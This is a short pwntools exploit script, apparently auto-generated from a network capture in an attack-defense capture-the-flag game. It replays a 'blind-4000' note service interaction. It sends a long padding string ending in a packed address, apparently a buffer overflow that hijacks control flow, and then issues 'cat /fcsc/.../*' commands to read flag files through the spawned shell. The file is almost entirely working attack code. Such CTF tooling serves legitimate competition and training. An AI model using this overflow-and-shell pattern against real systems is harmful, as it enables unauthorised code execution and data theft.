import json
import os

from pwn import *

"""
This file was generated from network capture towards 10.0.2.2 (TCP).
Corresponding flow id: 1524784517420974
Service: blind-4000
"""

# Set logging level
context.log_level = "DEBUG"  # or INFO, WARNING, ERROR

# Load environment variables
# EXTRA is an array of the flagids for current service and team
HOST = "127.0.0.1"
# EXTRA = json.loads(os.getenv("TARGET_EXTRA", "[]"))

# Connect to remote and run the actual exploit
# Timeout is important to prevent stall
r = remote(HOST, 4000, typ="tcp", timeout=2)

# FIXME: You should identify if a flag_id was used in the following
# payload. If it is the case, then you should loop using EXTRA.
# for flag_id in EXTRA:
data = r.recvuntil(b'e note summary.\n')
r.sendline(b'n')
data = r.recvuntil(b'vuVE8\nContent: \n')
r.sendline(b'PjiFs69P7liiKPaKS73Ym9IyPSAhw21Nd2xCCfbQSMboGcFfkYMjmY99ScBS2yjmZySDQDin64MwLI9ZhPqd1a5UZ3jpXXzv553SSHnQ7bDzLeBD5VRNMswiv36fHMu1RxkUMIRkpCqkTU2IQjZcSgF5SXOek0ifAGDXtyl1UUB34CPAqPbTq7eAtGVCoIChiYPoJJrW1JR5s6QNZWVKT7Jf5KbchBjIJjUMmbG6\xe5\x16@\x00\x00\x00\x00\x00')
# r.sendline(b'cat /fcsc/EpGne4SB6vZpm5gvjNyqSbMxmmACNjf/*')
r.sendline(b'cat /fcsc/ddJ565eGcAPFVkHZZFqXtrYe2vmVUQv/*')
data = r.recvuntil(b'ca8f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n')

# Use the following to capture all remaining bytes:
# data = r.recvall(timeout=5)
# print(data)

r.close()